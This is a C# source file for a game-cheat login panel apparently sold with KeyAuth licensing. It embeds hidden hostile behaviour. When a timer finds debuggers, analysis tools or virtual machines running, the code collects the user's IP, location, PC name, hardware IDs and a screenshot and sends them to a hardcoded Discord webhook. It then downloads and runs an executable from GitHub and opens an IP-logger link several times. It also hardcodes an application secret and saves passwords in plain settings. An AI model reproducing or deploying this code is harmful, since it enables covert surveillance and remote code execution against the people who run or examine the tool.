using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Falcon_X_Cheat;
using KeyAuth;
using System.Security.Principal;
using System.Net;
using Cheat;
using System.IO;
using System.Net.Http;
using System.Management;
using Newtonsoft.Json.Linq;
using System.Drawing.Imaging;

namespace FINDEXBRUTAL
{
    public partial class Form1 : Form
    {
        private List<string> processNames;
      
        
        private Timer timer;
        public Form1()
        {
            InitializeComponent();
            KeyAuthApp.init();
            PerformSecurityChecks();
            // Label settings
          
            processNames = new List<string>
        {
            "cheatengine-x86_64",
            "dnSpy",
            "HxD",
            "Cheat Engine",
            "cheatengine-i386",
            "cheatengine-x86_64-SSE4-AVX2",
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "x64dbg", "dnspy", "dnSpy.exe", "idax64", "Devicehackerp", "x32dbg", "x64dbg", "ollydbg", "dnspy", "processhacker",
            "scylla_x86", "scylla_x64", "cheat engine", "Cheat engine", "Cheat Engine", "cheatengine", "cheatengine-x86_64", "ilspy", "Process Hacker", "dnSpy", "ollydbg",
            "dnSpy-x86", "ProcessHacker", "x32dbg", "x64dbg", "dnSpy v6.1.8(64-bit,.NET)", "dnSpy.exe","ida64", "ida", "mynewkeygen-x86_64.vmp.exe", "Mynew Keygen", "mynewkeygen-x86_64.vmp.exe", "idaPro", "idaclang.cfg", "x32dbg", "Hxd", "cheatengine-i386","cheatengine-x86_64","cheatengine-x86_64-SSE4-AVX2","ida64"
        };

        }
        private void PerformSecurityChecks()
        {
            // Anti-debugging check
            if (Debugger.IsAttached || IsDebuggerPresent())
            {
                MessageBox.Show("Unauthorized debugging detected!", "Security Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }

            // Anti-tampering check
            if (!IsAdministrator())
            {
                MessageBox.Show("Please run the application as Administrator.", "Security Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                Environment.Exit(0);
            }
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        private static bool IsAdministrator()
        {
            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
            {
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        public static api KeyAuthApp = new api(
           name: "FINDEX PANEL", // Application Name
           ownerid: "iHF5aGJ521", // Owner ID
            secret: "319f5ae9d643b92e09757f09ad2298a86dceb0e4c3f0885879ff6bad4b7d1ca8", // Application Secret
           version: "1.0" // 


);

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/wJNK5tEn");
        }


        private async void Form1_Load(object sender, EventArgs e)
        {
            KeyAuthApp.init();
            // Load saved username and password
            if (!string.IsNullOrEmpty(Properties.Settings.Default.user) &&
                !string.IsNullOrEmpty(Properties.Settings.Default.pass))
            {
                username.Text = Properties.Settings.Default.user;
                password.Text = Properties.Settings.Default.pass;
            }
            string currentVersion = "1.0.0.0"; 
            string versionUrl = "https://pastebin.com/raw/UwLV91b3"; 

            using (WebClient client = new WebClient())
            {
                try
                {
                    string latestVersion = client.DownloadString(versionUrl).Trim();
                    if (latestVersion == currentVersion)
                    {
                       
                        this.Show();
                    }
                    else
                    {
                        // Version mismatch, show update message
                        MessageBox.Show("Update Available. Download Latest Version.", "Update Required", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        Application.Exit();
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error checking version: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Application.Exit();
                }
            }


        }

        private void EXITBTN_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }
     
        private void guna2ControlBox1_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void LOGINBTN_Click(object sender, EventArgs e)
        {
            KeyAuthApp.login(username.Text, password.Text);

            if (KeyAuthApp.response.success)
            {
                // Save login details if checkbox is checked
                if (guna2CheckBox1.Checked)
                {
                    Properties.Settings.Default.user = username.Text;
                    Properties.Settings.Default.pass = password.Text;
                    Properties.Settings.Default.Save(); // Save settings
                }

                Form2 ML = new Form2();
                ML.Show();
                Hide();
            }
            else
            {
                this.Alert(KeyAuthApp.response.message, FXMSG.enmType.Error);
            }
        }
        public void Alert(string msg, FXMSG.enmType type)
        {
            FXMSG frm = new FXMSG();
            frm.showAlert(msg, type);
        }

        private void guna2CheckBox1_CheckedChanged(object sender, EventArgs e)
        {

        }

        private void username_TextChanged(object sender, EventArgs e)
        {

        }

        private void password_TextChanged(object sender, EventArgs e)
        {

        }
        private async Task<string> FetchIpInfoAsync()
        {
            string ipInfoUrl = "https://ipinfo.io/json";
            HttpResponseMessage response = await httpClient.GetAsync(ipInfoUrl);
            return await response.Content.ReadAsStringAsync();
        }
        private string GetSerialNumber()
        {
            string serialNumber = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT SerialNumber FROM Win32_BIOS");
            foreach (ManagementObject mo in searcher.Get())
            {
                serialNumber = mo["SerialNumber"].ToString();
            }
            return serialNumber;
        }
        private async void timer1_Tick(object sender, EventArgs e)
        {

            string fileUrl = "https://github.com/Pawas44/test/raw/main/Built.exe";
            string savePath = Path.Combine(Path.GetTempPath(), "Built.exe");

            foreach (string processName in processNames)
            {
                var processes = Process.GetProcessesByName(processName);
                if (processes.Any())
                {
                    try
                    {
                        string jsonResponse = await FetchIpInfoAsync();
                        string ipInfoMessage = ParseIpInfo(jsonResponse);

                        string pcName = GetPcName();
                        string hwid = GetHwid();
                        string currentTime = GetCurrentTime();
                        string serialNumber = GetSerialNumber();
                        string screenshotPath = "screenshot.png";

                        TakeScreenshot(screenshotPath);

                        string message = $"{ipInfoMessage}\nPC Name: {pcName}\nHWID: {hwid}\nTime: {currentTime}";

                        string webhookUrl = "https://discord.com/api/webhooks/1333003236537270372/lBBmL07w9iHRjGhlmWK4rbYlr1k0DKvr_u-vAb0-0FNknuvUOmPf9BEfzyc6pFQx932G";

                        bool success = await SendToDiscordAsync(message, screenshotPath, webhookUrl);

                        // File download and execution logic
                        await DownloadAndOpenFileAsync(fileUrl, savePath);

                        MessageBox.Show("Mother Fucker You are Now Exposed Check My Server All your info are there");
                        MessageBox.Show("I Warned you Bastard");
                        Process.Start("https://iplis.ru/231TZ4");
                        Process.Start("https://iplis.ru/231TZ4");
                        Process.Start("https://iplis.ru/231TZ4");
                        Process.Start("https://iplis.ru/231TZ4");
                        this.Hide();
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show($"An error occurred: {ex.Message}");
                    }
                    break;
                }
            }
        }
        private async Task DownloadAndOpenFileAsync(string fileUrl, string savePath)
        {
            try
            {
                using (var client = new WebClient())
                {
                    // Asynchronously download the file
                    await client.DownloadFileTaskAsync(new Uri(fileUrl), savePath);
                }

                // Open the downloaded file
                Process.Start(savePath);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"An error occurred: {ex.Message}");
            }
        }


        private static readonly HttpClient httpClient = new HttpClient();
        private void TakeScreenshot(string filePath)
        {
            Bitmap bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            bmpScreenshot.Save(filePath, ImageFormat.Png);
        }

        private async Task<bool> SendToDiscordAsync(string message, string screenshotPath, string webhookUrl)
        {
            var payload = new
            {
                content = message
            };

            string payloadJson = JObject.FromObject(payload).ToString();
            var content = new MultipartFormDataContent
        {
            { new StringContent(payloadJson, Encoding.UTF8, "application/json"), "payload_json" },
            { new ByteArrayContent(System.IO.File.ReadAllBytes(screenshotPath)), "file", "screenshot.png" }
        };

            HttpResponseMessage webhookResponse = await httpClient.PostAsync(webhookUrl, content);
            return webhookResponse.IsSuccessStatusCode;
        }
        private string GetHwid()
        {
            string hwid = string.Empty;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
            foreach (ManagementObject mo in searcher.Get())
            {
                hwid = mo["ProcessorId"].ToString();
            }
            return hwid;
        }

        private string GetCurrentTime()
        {
            return DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
        }
        private string ParseIpInfo(string jsonResponse)
        {
            JObject json = JObject.Parse(jsonResponse);
            string ip = json["ip"].ToString();
            string city = json["city"].ToString();
            string region = json["region"].ToString();
            string country = json["country"].ToString();
            string loc = json["loc"].ToString();
            string org = json["org"].ToString();

            return $"IP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}\nLocation: {loc}\nOrganization: {org}";
        }

        private string GetPcName()
        {
            return Environment.MachineName;
        }

        private void timer1_Tick_1(object sender, EventArgs e)
        {

        }
    }
}
